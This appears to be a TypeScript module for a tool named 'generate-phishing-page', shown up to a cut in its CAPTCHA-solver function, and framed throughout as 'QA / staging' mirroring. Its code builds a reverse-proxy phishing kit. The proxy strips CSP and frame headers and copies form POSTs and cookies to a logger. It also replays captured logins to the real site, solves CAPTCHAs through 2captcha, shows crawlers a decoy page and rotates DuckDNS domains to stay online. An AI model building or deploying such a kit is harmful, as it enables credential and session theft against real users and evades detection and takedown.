/**
 * Optional QA / staging feature builders for generate-phishing-page.ts
 * All features are opt-in via CLI flags; disabled by default.
 */

export type TrainingCloneFeatures = {
  proxy: boolean
  rotate: boolean
  deploy: boolean
  balance: boolean
  toast: boolean
  redirect: boolean
  cloak: boolean
  lang: boolean
  solveCaptcha: boolean
  preapprove: boolean
}

export type TrainingCloneContext = {
  target: URL
  outDir: string
  demoApiUrl: string
  features: TrainingCloneFeatures
}

const BOT_UA_PATTERNS = [
  'googlebot',
  'bingbot',
  'slurp',
  'duckduckbot',
  'baiduspider',
  'yandexbot',
  'ahrefsbot',
  'semrushbot',
  'mj12bot',
  'dotbot',
  'petalbot',
  'facebot',
  'ia_archiver',
  'crawler',
  'spider',
  'bot/',
  'headless',
]

const LOAD_TEST_USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
]

export function parseProxyList(): string[] {
  const raw = process.env['PROXY_LIST']?.trim()
  if (!raw) return []
  return raw
    .split(/[\n,;]+/)
    .map((p) => p.trim())
    .filter(Boolean)
}

export function pickRotatingFetchHeaders(): Record<string, string> {
  const proxies = parseProxyList()
  const ua =
    LOAD_TEST_USER_AGENTS[Math.floor(Math.random() * LOAD_TEST_USER_AGENTS.length)] ??
    LOAD_TEST_USER_AGENTS[0]!
  const headers: Record<string, string> = {
    'User-Agent': ua,
    Accept: '*/*',
    'Accept-Language': 'en-US,en;q=0.9,es;q=0.8',
    'Cache-Control': 'no-cache',
  }
  if (proxies.length > 0) {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)]!
    headers['X-Forwarded-For'] = proxy.replace(/^https?:\/\//, '').split(':')[0] ?? proxy
    headers['X-Legion-Proxy-Pool'] = proxy
  }
  return headers
}

export function buildNginxProxyConfig(target: URL, listenPort = 8080): string {
  const origin = target.origin
  const host = target.host
  return `# Legion QA mirror — reverse proxy (staging only)
# Forwards API/asset requests to ${origin} for live content during UX tests.

worker_processes 1;
events { worker_connections 1024; }

http {
  include       /etc/nginx/mime.types;
  default_type  application/octet-stream;
  sendfile      on;
  keepalive_timeout 65;

  map $http_user_agent $is_bot_ua {
    default 0;
    ~*googlebot 1;
    ~*bingbot 1;
    ~*ahrefsbot 1;
    ~*semrushbot 1;
    ~*yandexbot 1;
    ~*baiduspider 1;
    ~*crawler 1;
    ~*spider 1;
  }

  server {
    listen ${listenPort};
    server_name localhost 127.0.0.1;

    root /usr/share/nginx/html;
    index index.html;

    # Static clone (generated assets + injections)
    location / {
      try_files $uri $uri/ @upstream;
    }

    location = /bots.html {
      internal;
    }

    # Bot simulation — informational page for crawlers (when --cloak used with proxy)
    error_page 418 = /bots.html;
    if ($is_bot_ua) { return 418; }

    # Live API passthrough (prices, balances, GraphQL)
    location ~ ^/(api|graphql|v1|v2|rpc|swap|quote)(/|$) {
      proxy_pass ${origin};
      proxy_ssl_server_name on;
      proxy_set_header Host ${host};
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_hide_header Content-Security-Policy;
      proxy_hide_header X-Frame-Options;
    }

    location @upstream {
      proxy_pass ${origin};
      proxy_ssl_server_name on;
      proxy_set_header Host ${host};
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_hide_header Content-Security-Policy;
      proxy_hide_header X-Frame-Options;
      sub_filter_once off;
      sub_filter '${origin}' 'http://$host:$server_port';
    }
  }
}
`
}

export function buildDockerCompose(proxyPort = 8080): string {
  return `# Legion QA mirror — docker-compose (staging only)
services:
  qa-mirror:
    image: nginx:alpine
    ports:
      - "${proxyPort}:8080"
    volumes:
      - ./:/usr/share/nginx/html:ro
      - ./nginx.conf:/etc/nginx/nginx.conf:ro
    restart: unless-stopped
    extra_hosts:
      - "host.docker.internal:host-gateway"
`
}

/**
 * Full transparent reverse proxy for QA routing / latency tests.
 * Serves a local status page at `/` only; all other paths forward to the target origin.
 * Optional --log-forms: nginx mirror sends POST copies to local logger.js (logs.json).
 * Optional --test-login (requires --log-forms): logger replays POSTs via internal mirror; logs cookies locally.
 * Optional --replay-original (requires --test-login): also replays once to the real target origin for auth testing.
 * Optional --solve-captcha (requires --log-forms): 2captcha API via captcha-solver.js (staging QA only).
 */
export function buildMirrorNginxConfig(
  target: URL,
  listenPort = 8080,
  opts?: {
    logForms?: boolean
    testLogin?: boolean
    replayOriginal?: boolean
    solveCaptcha?: boolean
    autoRotate?: boolean
    loggerHost?: string
    loggerPort?: number
  },
): string {
  const origin = target.origin
  const host = target.host
  const upstreamScheme = target.protocol === 'https:' ? 'https' : 'http'
  const logForms = opts?.logForms === true
  const testLogin = opts?.testLogin === true
  const replayOriginal = opts?.replayOriginal === true
  const solveCaptcha = opts?.solveCaptcha === true
  const autoRotate = opts?.autoRotate === true
  const loggerHost = opts?.loggerHost ?? 'form-logger'
  const loggerPort = opts?.loggerPort ?? 9090

  const formLogBlock = logForms
    ? `
  map $request_method $legion_mirror_log_uri {
    default "";
    POST    /__legion_mirror_log__;
  }

  upstream legion_form_logger {
    server ${loggerHost}:${loggerPort};
  }
`
    : ''

  const formLogServerBlock = logForms
    ? `
    location = /__legion_mirror_log__ {
      internal;
      proxy_pass http://legion_form_logger/log;
      proxy_pass_request_body on;
      proxy_set_header Content-Type $http_content_type;
      proxy_set_header X-Original-URI $request_uri;
      proxy_set_header X-Original-Method $request_method;
      proxy_set_header X-Legion-Mirror-Log "1";${testLogin || replayOriginal ? `
      proxy_set_header X-Original-Referer $http_referer;
      proxy_set_header X-Original-Origin $http_origin;
      proxy_set_header X-Original-User-Agent $http_user_agent;
      proxy_set_header X-Original-Cookie $http_cookie;` : ''}
    }
`
    : ''

  const mirrorDirectives = logForms
    ? `
      mirror $legion_mirror_log_uri;
      mirror_request_body on;`
    : ''

  const captchaServerBlock =
    logForms && solveCaptcha
      ? `
    location = /__legion_captcha_solve__ {
      proxy_pass http://legion_form_logger/captcha/solve;
      proxy_set_header Content-Type $http_content_type;
      proxy_set_header X-Legion-Captcha-QA "1";
    }

    location /__legion__/ {
      alias /usr/share/nginx/html/__legion__/;
      add_header Cache-Control "no-store";
    }
`
      : ''

  const captchaSubFilter = solveCaptcha
    ? `
      sub_filter_once off;
      sub_filter_types text/html;
      sub_filter '</body>' '<script src="/__legion__/captcha-client.js" defer></script></body>';
      proxy_set_header Accept-Encoding "";`
    : ''

  return `# Legion QA — dynamic reverse proxy (staging only)
# Target: ${origin}
# GET / → local "Mirror active" status page (no upstream fetch)
# All other paths → forwarded to ${origin} for routing / latency testing
${logForms ? `# POST bodies → mirrored to local logger (${loggerHost}:${loggerPort}/log → logs.json)\n` : ''}${testLogin ? `# --test-login: form-logger replays POSTs to internal mirror only (replay.js → session_cookies.json)\n` : ''}${replayOriginal ? `# --replay-original: replay.js also POSTs once to ${origin} (original_session_cookies.json)\n` : ''}${solveCaptcha ? `# --solve-captcha: captcha-solver.js + injected captcha-client.js (2captcha API, logs/captcha_solver.log)\n` : ''}${autoRotate ? `# --auto-rotate: DuckDNS + rotate-domain.sh (12h health check, nginx TLS on :443)\n` : ''}
worker_processes 1;
events { worker_connections 2048; }

http {
  include       /etc/nginx/mime.types;
  default_type  application/octet-stream;
  sendfile      on;
  keepalive_timeout 65;
  proxy_connect_timeout 60s;
  proxy_send_timeout 120s;
  proxy_read_timeout 120s;
  proxy_buffering on;
${formLogBlock}
  server {
    listen ${listenPort};
    server_name localhost 127.0.0.1;

    root /usr/share/nginx/html;
    index index.html;

    # Local status page only — no upstream proxy
    location = / {
      try_files /index.html =404;
      add_header Cache-Control "no-store";
      add_header X-Legion-Mirror "active";
    }

    location = /index.html {
      add_header Cache-Control "no-store";
      add_header X-Legion-Mirror "active";
    }

    location = /mirror-config.json {
      add_header Cache-Control "no-store";
      add_header Content-Type application/json;
    }
${formLogServerBlock}${captchaServerBlock}
    # Forward every other request path to the configured target origin
    location / {${mirrorDirectives}${captchaSubFilter}
      proxy_pass ${upstreamScheme}://${host};
      proxy_ssl_server_name on;
      proxy_set_header Host ${host};
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_set_header X-Forwarded-Host $host;
      proxy_redirect off;
    }
  }
${autoRotate ? '  include /etc/nginx/rotate/active-domain.conf;\n' : ''}}
`
}

export function buildMirrorDockerCompose(
  hostPort = 8080,
  opts?: {
    logForms?: boolean
    testLogin?: boolean
    replayOriginal?: boolean
    instantReplay?: boolean
    solveCaptcha?: boolean
    loggerPort?: number
    targetHost?: string
    targetOrigin?: string
    autoRotate?: boolean
    duckdnsBase?: string
  },
): string {
  const logForms = opts?.logForms === true
  const testLogin = opts?.testLogin === true
  const replayOriginal = opts?.replayOriginal === true
  const instantReplay = opts?.instantReplay === true
  const solveCaptcha = opts?.solveCaptcha === true
  const autoRotate = opts?.autoRotate === true
  const duckdnsBase = opts?.duckdnsBase ?? 'qa-mirror'
  const loggerPort = opts?.loggerPort ?? 9090
  const targetHost = opts?.targetHost ?? 'localhost'
  const targetOrigin = opts?.targetOrigin ?? `https://${targetHost}`

  const needsNpm = testLogin
  const npmPackages = replayOriginal
    ? 'axios@1.7.9 tough-cookie@4.1.3 axios-cookiejar-support@5.0.3'
    : 'axios@1.7.9'
  const loggerCommand = needsNpm
    ? `["sh", "-c", "npm install --omit=dev ${npmPackages} && node logger.js"]`
    : '["node", "logger.js"]'

  const loggerEnvParts: string[] = []
  if (testLogin) {
    loggerEnvParts.push(`
      TEST_LOGIN_ENABLED: "true"
      MIRROR_INTERNAL_URL: "http://qa-dynamic-mirror:8080"
      TARGET_HOST: "${targetHost}"
      TARGET_ORIGIN: "${targetOrigin}"
      SESSION_COOKIES_FILE: /app/logs/session_cookies.json
      REPLAY_LOG_FILE: /app/logs/replay_log.txt`)
    if (replayOriginal) {
      const instantEnv = instantReplay
        ? `
      ORIGINAL_REPLAY_DELAY_MS: "0"
      INSTANT_REPLAY_ENABLED: "true"
      ORIGINAL_REPLAY_CSRF_BUDGET_MS: "\${ORIGINAL_REPLAY_CSRF_BUDGET_MS:-300}"`
        : `
      ORIGINAL_REPLAY_DELAY_MS: "\${ORIGINAL_REPLAY_DELAY_MS:-1000}"`
      loggerEnvParts.push(`
      ORIGINAL_REPLAY_ENABLED: "true"${instantEnv}
      ORIGINAL_SESSION_COOKIES_FILE: /app/logs/original_session_cookies.json
      ORIGINAL_REPLAY_LOG_FILE: /app/logs/original_replay_log.txt`)
    } else {
      loggerEnvParts.push(`
      ORIGINAL_REPLAY_ENABLED: "\${ORIGINAL_REPLAY_ENABLED:-false}"`)
    }
  }
  if (solveCaptcha) {
    loggerEnvParts.push(`
      SOLVE_CAPTCHA_ENABLED: "true"
      TWOCAPTCHA_API_KEY: \${TWOCAPTCHA_API_KEY}
      CAPTCHA_SOLVER_LOG: /app/logs/captcha_solver.log
      TARGET_PAGE_ORIGIN: "${targetOrigin}"`)
  }
  const loggerEnv = loggerEnvParts.join('')

  const volumeLines = ['      - ./logger.js:/app/logger.js:ro']
  if (testLogin) volumeLines.push('      - ./replay.js:/app/replay.js:ro')
  if (solveCaptcha) volumeLines.push('      - ./captcha-solver.js:/app/captcha-solver.js:ro')
  volumeLines.push('      - ./logs:/app/logs')
  const loggerVolumes = volumeLines.join('\n')

  const loggerService = logForms
    ? `
  form-logger:
    image: node:20-alpine
    working_dir: /app
    command: ${loggerCommand}
    volumes:
${loggerVolumes}
    environment:
      LOGGER_PORT: "${loggerPort}"
      LOG_FILE: /app/logs/logs.json${loggerEnv}
    expose:
      - "${loggerPort}"
    restart: unless-stopped
`
    : ''

  const mirrorDepends = logForms ? '    depends_on:\n      - form-logger\n' : ''

  const mirrorPorts = autoRotate
    ? `      - "${hostPort}:8080"\n      - "8443:443"`
    : `      - "${hostPort}:8080"`

  const mirrorVolumes = autoRotate
    ? `      - ./:/usr/share/nginx/html:ro
      - ./nginx.conf:/etc/nginx/nginx.conf:ro
      - ./rotate:/etc/nginx/rotate:ro
      - ./ssl:/etc/nginx/ssl:ro`
    : `      - ./:/usr/share/nginx/html:ro
      - ./nginx.conf:/etc/nginx/nginx.conf:ro`

  const rotatorService = autoRotate
    ? `
  domain-rotator:
    image: docker:27.4.0-cli
    working_dir: /stack
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
      - .:/stack
    environment:
      DUCKDNS_TOKEN: \${DUCKDNS_TOKEN}
      DUCKDNS_SUBDOMAIN: \${DUCKDNS_SUBDOMAIN:-${duckdnsBase}-01}
      ROTATE_INTERVAL_SEC: "\${ROTATE_INTERVAL_SEC:-43200}"
      QA_MIRROR_PORT: "${hostPort}"
      USE_CERTBOT: \${USE_CERTBOT:-false}
      STACK_DIR: /stack
      TARGET_HOST: "${targetHost}"
    entrypoint: ["/bin/sh", "-c"]
    command:
      - |
        apk add --no-cache curl openssl bash
        chmod +x /stack/rotate-domain.sh
        cd /stack
        ./rotate-domain.sh --init
        while true; do
          sleep \$\$ROTATE_INTERVAL_SEC
          ./rotate-domain.sh --daemon-tick || true
        done
    restart: unless-stopped
    depends_on:
      - qa-dynamic-mirror
`
    : ''

  return `# Legion QA dynamic mirror — docker-compose (staging only)
# Start: docker compose up
# Status: http://localhost:${hostPort}/
# Proxied site: http://localhost:${hostPort}/<any-path-on-target>
${logForms ? `# Form POST debug logs: ./logs/logs.json (local only)\n` : ''}${testLogin ? `# Login QA replay: ./logs/session_cookies.json + ./logs/replay_log.txt (internal mirror only)\n` : ''}${replayOriginal ? `# Original target replay: ./logs/original_session_cookies.json (once per capture)\n` : ''}${solveCaptcha ? `# CAPTCHA QA: ./logs/captcha_solver.log (2captcha API — set TWOCAPTCHA_API_KEY)\n` : ''}${autoRotate ? `# Auto-rotate: DuckDNS + rotate-domain.sh (set DUCKDNS_TOKEN, DUCKDNS_SUBDOMAIN)\n# HTTPS: https://<subdomain>.duckdns.org:8443/\n` : ''}
services:
  qa-dynamic-mirror:
    image: nginx:alpine
    ports:
${mirrorPorts}
    volumes:
${mirrorVolumes}
    restart: unless-stopped
${mirrorDepends}${loggerService}${rotatorService}`
}

/** DuckDNS-safe slug from target hostname. */
export function duckdnsSlugFromTarget(target: URL): string {
  return target.hostname.replace(/[^a-z0-9]+/gi, '-').replace(/^-|-$/g, '').toLowerCase() || 'qa-mirror'
}

/**
 * Generates nginx server block for active DuckDNS subdomain (included from active-domain.conf).
 */
export function buildAutoRotateNginxSnippet(
  target: URL,
  fqdn: string,
  upstreamHost: string,
): string {
  const upstreamScheme = target.protocol === 'https:' ? 'https' : 'http'
  return `# Generated by rotate-domain.sh — ${fqdn}
server {
  listen 443 ssl http2;
  server_name ${fqdn};

  ssl_certificate     /etc/nginx/ssl/active.crt;
  ssl_certificate_key /etc/nginx/ssl/active.key;
  ssl_protocols TLSv1.2 TLSv1.3;
  ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305;
  ssl_prefer_server_ciphers off;
  ssl_session_cache shared:SSL:10m;
  ssl_session_tickets off;
  add_header Strict-Transport-Security "max-age=63072000" always;

  location = / {
    root /usr/share/nginx/html;
    try_files /index.html =404;
    add_header Cache-Control "no-store";
    add_header X-Legion-Mirror "active";
    add_header X-Legion-DuckDNS "${fqdn}";
  }

  location / {
    proxy_pass ${upstreamScheme}://${upstreamHost};
    proxy_ssl_server_name on;
    proxy_set_header Host ${upstreamHost};
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_set_header X-Forwarded-Host ${fqdn};
    proxy_redirect off;
  }
}
`
}

/**
 * Real DuckDNS rotation script for --auto-rotate (API calls + nginx reload via docker).
 */
export function buildAutoRotateDomainScript(target: URL, hostPort: number, duckdnsBase: string): string {
  const origin = target.origin
  const upstreamHost = target.host
  const generated = new Date().toISOString()

  return `#!/usr/bin/env bash
# =============================================================================
# DuckDNS auto-rotation — AUTHORIZED STAGING RESILIENCE TESTING ONLY
# =============================================================================
# Target: ${origin}
# Generated: ${generated}
#
# Requires: DUCKDNS_TOKEN, DUCKDNS_SUBDOMAIN (env or duckdns.env)
# Optional: ROTATE_INTERVAL_SEC (default 43200), USE_CERTBOT=false, QA_MIRROR_PORT=${hostPort}
#
# Usage:
#   ./rotate-domain.sh --init          # register DNS + nginx TLS (run on stack start)
#   ./rotate-domain.sh --daemon-tick   # health check; rotate if mirror unreachable
#   ./rotate-domain.sh --rotate-now      # force rotation to next counter suffix
#   ./rotate-domain.sh --status
# =============================================================================
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "\${BASH_SOURCE[0]}")" && pwd)"
STACK_DIR="\${STACK_DIR:-$SCRIPT_DIR}"
STATE_FILE="\${STACK_DIR}/logs/domain_state.json"
ROTATE_LOG="\${STACK_DIR}/logs/rotate.log"
NGINX_SNIPPET="\${STACK_DIR}/rotate/active-domain.conf"
SSL_DIR="\${STACK_DIR}/ssl"
ENV_FILE="\${STACK_DIR}/duckdns.env"
BASE_SLUG="\${DUCKDNS_BASE:-${duckdnsBase}}"
HOST_PORT="\${QA_MIRROR_PORT:-${hostPort}}"
UPSTREAM_HOST="${upstreamHost}"
TARGET_ORIGIN="${origin}"

if [[ -f "$ENV_FILE" ]]; then
  set -a
  # shellcheck disable=SC1090
  source "$ENV_FILE"
  set +a
fi

: "\${DUCKDNS_TOKEN:?Set DUCKDNS_TOKEN in environment or duckdns.env}"

log() {
  mkdir -p "$(dirname "$ROTATE_LOG")"
  echo "$(date -Iseconds) $*" | tee -a "$ROTATE_LOG"
}

read_state() {
  if [[ ! -f "$STATE_FILE" ]]; then
    echo '{"counter":0,"current":""}'
    return
  fi
  cat "$STATE_FILE"
}

write_state() {
  mkdir -p "$(dirname "$STATE_FILE")"
  printf '%s\\n' "$1" > "$STATE_FILE"
}

public_ip() {
  if [[ -n "\${PUBLIC_IP:-}" ]]; then
    echo "$PUBLIC_IP"
    return
  fi
  curl -sf --max-time 15 https://checkip.amazonaws.com | tr -d '[:space:]'
}

duckdns_update() {
  local subdomain="$1"
  local ip="$2"
  local url="https://www.duckdns.org/update?domains=\${subdomain}&token=\${DUCKDNS_TOKEN}&ip=\${ip}"
  log "DUCKDNS update subdomain=\${subdomain} ip=\${ip}"
  local resp
  resp="$(curl -sf --max-time 30 "$url" || echo "KO")"
  log "DUCKDNS response: $resp"
  [[ "$resp" == "OK" ]]
}

next_subdomain_name() {
  local counter="$1"
  printf '%s-%02d' "$BASE_SLUG" "$counter"
}

ensure_self_signed_cert() {
  local fqdn="$1"
  mkdir -p "$SSL_DIR"
  if [[ "\${USE_CERTBOT:-false}" == "true" && -f "$SSL_DIR/active.crt" && -f "$SSL_DIR/active.key" ]]; then
    log "USE_CERTBOT=true — using existing ssl/active.{crt,key} (run certbot manually if needed)"
    return 0
  fi
  log "Generating self-signed TLS cert for $fqdn"
  openssl req -x509 -nodes -days 365 -newkey rsa:2048 \\
    -keyout "$SSL_DIR/active.key" \\
    -out "$SSL_DIR/active.crt" \\
    -subj "/CN=$fqdn" 2>/dev/null
}

write_nginx_snippet() {
  local fqdn="$1"
  cat > "$NGINX_SNIPPET" <<'NGINX_EOF'
# Generated by rotate-domain.sh
server {
  listen 443 ssl http2;
  server_name FQDN_PLACEHOLDER;

  ssl_certificate     /etc/nginx/ssl/active.crt;
  ssl_certificate_key /etc/nginx/ssl/active.key;
  ssl_protocols TLSv1.2 TLSv1.3;
  ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305;
  ssl_prefer_server_ciphers off;
  ssl_session_cache shared:SSL:10m;
  ssl_session_tickets off;
  add_header Strict-Transport-Security "max-age=63072000" always;

  location = / {
    root /usr/share/nginx/html;
    try_files /index.html =404;
    add_header Cache-Control "no-store";
    add_header X-Legion-Mirror "active";
    add_header X-Legion-DuckDNS "FQDN_PLACEHOLDER";
  }

  location / {
    proxy_pass ${target.protocol === 'https:' ? 'https' : 'http'}://UPSTREAM_PLACEHOLDER;
    proxy_ssl_server_name on;
    proxy_set_header Host UPSTREAM_PLACEHOLDER;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_set_header X-Forwarded-Host FQDN_PLACEHOLDER;
    proxy_redirect off;
  }
}
NGINX_EOF
  sed -i "s/FQDN_PLACEHOLDER/$fqdn/g; s/UPSTREAM_PLACEHOLDER/$UPSTREAM_HOST/g" "$NGINX_SNIPPET" 2>/dev/null \\
    || sed -i '' "s/FQDN_PLACEHOLDER/$fqdn/g; s/UPSTREAM_PLACEHOLDER/$UPSTREAM_HOST/g" "$NGINX_SNIPPET"
}

reload_mirror() {
  log "Reloading qa-dynamic-mirror container"
  if command -v docker >/dev/null 2>&1 && [[ -S /var/run/docker.sock ]]; then
    docker compose -f "$STACK_DIR/docker-compose.yml" restart qa-dynamic-mirror
  else
    log "WARN: docker socket unavailable — run: docker compose restart qa-dynamic-mirror"
  fi
}

health_ok() {
  local fqdn="$1"
  if curl -sf --max-time 10 "http://127.0.0.1:\${HOST_PORT}/" >/dev/null 2>&1; then
    return 0
  fi
  if curl -sf --max-time 15 "http://\${fqdn}:\${HOST_PORT}/" >/dev/null 2>&1; then
    return 0
  fi
  if curl -sfk --max-time 15 "https://\${fqdn}:8443/" >/dev/null 2>&1; then
    return 0
  fi
  return 1
}

apply_subdomain() {
  local counter="$1"
  local subdomain
  subdomain="$(next_subdomain_name "$counter")"
  local fqdn="\${subdomain}.duckdns.org"
  local ip
  ip="$(public_ip)"

  duckdns_update "$subdomain" "$ip"
  ensure_self_signed_cert "$fqdn"
  write_nginx_snippet "$fqdn"

  write_state "$(printf '{"counter":%s,"current":"%s","fqdn":"%s","updated_at":"%s","ip":"%s"}' \\
    "$counter" "$subdomain" "$fqdn" "$(date -Iseconds)" "$ip")"

  log "Active domain: $fqdn (counter $counter)"
  reload_mirror
}

cmd_init() {
  local start="\${DUCKDNS_SUBDOMAIN:-\$(next_subdomain_name 1)}"
  local counter=1
  if [[ "$start" =~ -([0-9]+)$ ]]; then
    counter="\${BASH_REMATCH[1]}"
  fi
  apply_subdomain "$counter"
}

cmd_rotate_now() {
  local state counter current
  state="$(read_state)"
  counter="$(echo "$state" | sed -n 's/.*"counter":\\([0-9]*\\).*/\\1/p')"
  counter="\${counter:-1}"
  counter=$((10#$counter + 1))
  apply_subdomain "$counter"
}

cmd_daemon_tick() {
  local state fqdn subdomain
  state="$(read_state)"
  fqdn="$(echo "$state" | sed -n 's/.*"fqdn":"\\([^"]*\\)".*/\\1/p')"
  subdomain="$(echo "$state" | sed -n 's/.*"current":"\\([^"]*\\)".*/\\1/p')"
  if [[ -z "$fqdn" ]]; then
    log "No active domain — running init"
    cmd_init
    return
  fi
  log "Health check: $fqdn"
  if health_ok "$fqdn"; then
    log "Health OK — no rotation"
    ip="$(public_ip)"
    duckdns_update "$subdomain" "$ip" || true
    return
  fi
  log "Health FAIL — rotating subdomain"
  cmd_rotate_now
}

cmd_status() {
  echo "=== Auto-rotate status ==="
  echo "Target: $TARGET_ORIGIN"
  echo "State file: $STATE_FILE"
  cat "$STATE_FILE" 2>/dev/null || echo '{}'
  echo ""
  echo "Tail log: $ROTATE_LOG"
  tail -n 20 "$ROTATE_LOG" 2>/dev/null || true
}

case "\${1:-}" in
  --init) cmd_init ;;
  --daemon-tick) cmd_daemon_tick ;;
  --rotate-now) cmd_rotate_now ;;
  --status) cmd_status ;;
  *)
    echo "Usage: $0 {--init|--daemon-tick|--rotate-now|--status}"
    exit 1
    ;;
esac
`
}

export function buildAutoRotateReadme(target: URL, hostPort: number, duckdnsBase: string): string {
  return `# Auto-rotate DuckDNS — staging resilience testing

**Target:** ${target.href}
**Base subdomain slug:** \`${duckdnsBase}-NN\` (e.g. \`${duckdnsBase}-01.duckdns.org\`)

## Requirements

- \`DUCKDNS_TOKEN\` — from [duckdns.org](https://www.duckdns.org)
- \`DUCKDNS_SUBDOMAIN\` — initial subdomain **without** \`.duckdns.org\` (default: \`${duckdnsBase}-01\`)
- Pre-create rotated subdomains in DuckDNS dashboard (\`${duckdnsBase}-02\`, etc.) or use increment pattern your account allows

## Start

\`\`\`bash
export DUCKDNS_TOKEN=your_token
export DUCKDNS_SUBDOMAIN=${duckdnsBase}-01
docker compose up -d
\`\`\`

The \`domain-rotator\` service runs \`rotate-domain.sh --init\`, then health checks every **12 hours** (\`ROTATE_INTERVAL_SEC=43200\`).

## Endpoints

- Local HTTP: http://localhost:${hostPort}/
- DuckDNS HTTPS: https://<subdomain>.duckdns.org:8443/ (self-signed cert by default)
- Set \`USE_CERTBOT=true\` and mount certs to \`ssl/\` for Let's Encrypt (manual certbot step)

## Logs

- \`logs/rotate.log\` — DuckDNS API + rotation events
- \`logs/domain_state.json\` — current counter and FQDN

## Manual commands

\`\`\`bash
./rotate-domain.sh --status
./rotate-domain.sh --rotate-now
\`\`\`

Authorized staging / resilience exercises only.
`
}

/**
 * Server-side 2captcha helper for mirror QA — logs all API calls locally.
 * @param type recaptcha_v2 | recaptcha_v3 | hcaptcha | turnstile
 */
export function buildCaptchaSolverJs(target: URL): string {
  const origin = target.origin

  return `'use strict';
/**
 * 2captcha solver for mirror QA (staging only).
 * Target reference: ${origin}
 * Requires TWOCAPTCHA_API_KEY in environment.
 */
const fs = require('fs');
const path = require('path');

const API_KEY = process.env.TWOCAPTCHA_API_KEY || '';
const LOG_FILE = process.env.CAPTCHA_SOLVER_LOG || path.join(__dirname, 'logs', 'captcha_solver.log');
const POLL_INTERVAL_MS = Number.parseInt(process.env.CAPTCHA_POLL_MS || '5000', 10);
const POLL_MAX = Number.parseInt(process.env.CAPTCHA_POLL_MAX || '24', 10);
const DEFAULT_PAGE_URL = process.env.TARGET_PAGE_ORIGIN || ${JSON.stringify(origin)};

const METHOD_MAP = {
  recaptcha_v2: 'userrecaptcha',
  recaptcha_v3: 'userrecaptcha',
  hcaptcha: 'hcaptcha',
  turnstile: 'turnstile',
};

const TOKEN_FIELDS = {
  recaptcha_v2: 'g-recaptcha-response',
  recaptcha_v3: 'g-recaptcha-response',
  hcaptcha: 'h-captcha-response',
  turnstile: 'cf-turnstile-response',
};

function appendLog(line) {
  fs.mkdirSync(path.dirname(LOG_FILE), { recursive: true });
  fs.appendFileSync(LOG_FILE, new Date().toISOString() + ' ' + line + '\\n', 'utf8');
}

async function apiCreate(params) {
  appendLog('CREATE ' + params.get('method') + ' sitekey=' + (params.get('sitekey') || '').slice(0, 12) + '…');
  const res = await fetch('https://2captcha.com/in.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: params,
  });
  const json = await res.json();
  if (json.status !== 1) {
    appendLog('CREATE_FAIL ' + (json.request || 'unknown'));
    throw new Error(json.request || '2captcha create failed');
  }
  appendLog('TASK id=' + json.request);
  return json.request;
}

async function apiPoll(taskId) {
  for (let i = 0; i < POLL_MAX; i++) {
    await new Promise((r) => setTimeout(r, POLL_INTERVAL_MS));
    const url =
      'https://2captcha.com/res.php?' +
      new URLSearchParams({
        key: API_KEY,
        action: 'get',
        id: String(taskId),
        json: '1',
      });
    const res = await fetch(url);
    const json = await res.json();
    if (json.status === 1) {
      appendLog('SOLVED id=' + taskId + ' token_len=' + String(json.request || '').length);
      return json.request;
    }
    if (json.request !== 'CAPCHA_NOT_READY') {
      appendLog('POLL_FAIL id=' + taskId + ' ' + (json.request || 'unknown'));
      throw new Error(json.request || '2captcha poll failed');
    }
  }
  appendLog('TIMEOUT id=' + taskId);
  throw new Error('2captcha timeout');
}

/**
 * Solve CAPTCHA via 2captcha HTTP API.
 * @param {string} type recaptcha_v2 | recaptcha_v3 | hcaptcha | turnstile
 * @param {string} siteKey
 * @param {string} pageUrl
 * @param {{ action?: string, minScore?: number }} [options]
 * @returns {Promise<string>} token
 */
async function solveCaptcha(type, siteKey, pageUrl, options) {
  if (!API_KEY) throw new Error('TWOCAPTCHA_API_KEY not configured');
  const normalized = String(type || '').toLowerCase().replace(/-/g, '_');
  const method = METHOD_MAP[normalized];
  if (!method) throw new Error('Unsupported captcha type: ' + type);

  const params = new URLSearchParams({
    key: API_KEY,
    method,
    sitekey: String(siteKey || ''),
    pageurl: String(pageUrl || DEFAULT_PAGE_URL),
    json: '1',
  });

  if (normalized === 'recaptcha_v3') {
    params.set('version', 'v3');
